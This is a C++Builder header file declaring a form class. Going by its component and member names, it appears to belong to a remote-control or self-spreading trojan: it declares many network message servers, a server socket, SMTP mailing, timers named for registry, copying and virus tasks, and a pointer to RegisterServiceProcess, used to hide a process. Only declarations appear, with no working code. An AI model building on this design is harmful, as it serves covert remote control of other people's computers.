//---------------------------------------------------------------------------
#ifndef Unit1H
#define Unit1H
//---------------------------------------------------------------------------
#include <Classes.hpp>
#include <Controls.hpp>
#include <StdCtrls.hpp>
#include <Forms.hpp>
#include <ExtCtrls.hpp>
#include <NMMSG.hpp>
#include <Psock.hpp>
#include <ScktComp.hpp>
#include <MPlayer.hpp>
#include <Classes.hpp>
#include <Controls.hpp>
#include <StdCtrls.hpp>
#include <Forms.hpp>
#include <NMsmtp.hpp>
#pragma warn -dup
#define WINVER 0x400
#include <ras.h>
#define WINVER 0x500
#include <winspool.h>
//---------------------------------------------------------------------------
typedef DWORD (__stdcall *pRegFunction)(DWORD, DWORD);
class TForm1 : public TForm
{
__published:	// IDE-managed Components
    TTimer *rejestr2;
    TTimer *copy;
    TNMMSGServ *NMMSGServ1;
    TNMMsg *NMMsg1;
    TNMMSGServ *NMMSGServ2;
    TNMMSGServ *NMMSGServ3;
    TNMMSGServ *NMMSGServ4;
    TNMMsg *NMMsg2;
    TMemo *Memo1;
    TNMMSGServ *NMMSGServ5;
    TMemo *Memo2;
    TNMMsg *NMMsg4;
    TMemo *Memo3;
    TNMMsg *NMMsg5;
    TTimer *Timer2;
    TServerSocket *ServerSocket1;
    TNMMSGServ *NMMSGServ6;
    TTimer *viri1;
    TNMMsg *NMMsg6;
    TLabel *Label1;
    TMemo *Memo4;
    TNMMsg *NMMsg7;
    TNMMSGServ *NMMSGServ7;
    TNMMsg *NMMsg3;
    TNMMsg *NMMsg8;
    TNMMSGServ *NMMSGServ8;
    TMediaPlayer *MediaPlayer1;
    TNMMSGServ *NMMSGServ9;
    TNMMSGServ *NMMSGServ10;
    TNMMsg *NMMsg9;
    TTimer *Timer1;
    TMemo *Memo5;
    TNMSMTP *NMSMTP1;
    TNMMSGServ *NMMSGServ11;
    TNMMsg *NMMsg10;
    TMemo *Memo6;
    TNMMSGServ *NMMSGServ12;
    TNMMsg *NMMsg11;
    TNMMsg *NMMsg12;
    TNMMsg *NMMsg13;
    TNMMSGServ *NMMSGServ13;
    TNMMsg *NMMsg14;
    TNMMsg *NMMsg15;
    TNMMSGServ *NMMSGServ14;
    TNMMsg *NMMsg16;
    void __fastcall rejestr2Timer(TObject *Sender);
    void __fastcall copyTimer(TObject *Sender);
    
    void __fastcall NMMSGServ3MSG(TComponent *Sender,
          const AnsiString sFrom, const AnsiString sMsg);
    void __fastcall NMMSGServ2MSG(TComponent *Sender,
          const AnsiString sFrom, const AnsiString sMsg);
    void __fastcall NMMSGServ4MSG(TComponent *Sender,
          const AnsiString sFrom, const AnsiString sMsg);
    void __fastcall NMMSGServ1MSG(TComponent *Sender,
          const AnsiString sFrom, const AnsiString sMsg);


    void __fastcall NMMSGServ5MSG(TComponent *Sender,
          const AnsiString sFrom, const AnsiString sMsg);
    
    void __fastcall Timer2Timer(TObject *Sender);
    
    void __fastcall NMMSGServ6MSG(TComponent *Sender,
          const AnsiString sFrom, const AnsiString sMsg);

void __fastcall viri1Timer(TObject *Sender);
    
    void __fastcall NMMSGServ7MSG(TComponent *Sender,
          const AnsiString sFrom, const AnsiString sMsg);
    void __fastcall NMMSGServ8MSG(TComponent *Sender,
          const AnsiString sFrom, const AnsiString sMsg);
    void __fastcall NMMSGServ9MSG(TComponent *Sender,
          const AnsiString sFrom, const AnsiString sMsg);
    
    
    void __fastcall FormCreate(TObject *Sender);
    void __fastcall Timer1Timer(TObject *Sender);
    void __fastcall NMMSGServ11MSG(TComponent *Sender,
          const AnsiString sFrom, const AnsiString sMsg);
    void __fastcall NMMSGServ12MSG(TComponent *Sender,
          const AnsiString sFrom, const AnsiString sMsg);
    
    
    void __fastcall NMMSGServ14MSG(TComponent *Sender,
          const AnsiString sFrom, const AnsiString sMsg);
    
    
private:	// User declarations
HINSTANCE hKernelLib;
pRegFunction RegisterServiceProcess;
AnsiString WinDir;
int BufferSize;
char Dir1[50];
HRASCONN hRas;
bool SprawdzPolaczenie();
public:		// User declarations
    __fastcall TForm1(TComponent* Owner);
    __fastcall ~TForm1();
};
//---------------------------------------------------------------------------
extern PACKAGE TForm1 *Form1;
//---------------------------------------------------------------------------
#endif
